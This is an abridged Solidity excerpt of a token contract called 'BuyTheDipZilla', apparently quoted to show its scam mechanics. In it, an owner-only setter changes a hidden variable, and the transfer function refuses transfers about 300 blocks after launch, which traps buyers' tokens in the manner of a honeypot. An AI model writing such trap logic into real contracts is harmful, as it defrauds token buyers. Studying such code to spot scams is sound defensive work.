...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function GBULLZ(uint256 BULL) external onlyOwner(){
        _bull = BULL;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(block.number - _start < 300, 'ERC:20 FU');
...
contract BuyTheDipZilla is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("BuyTheDipZilla", "BuyTheDipZilla") {
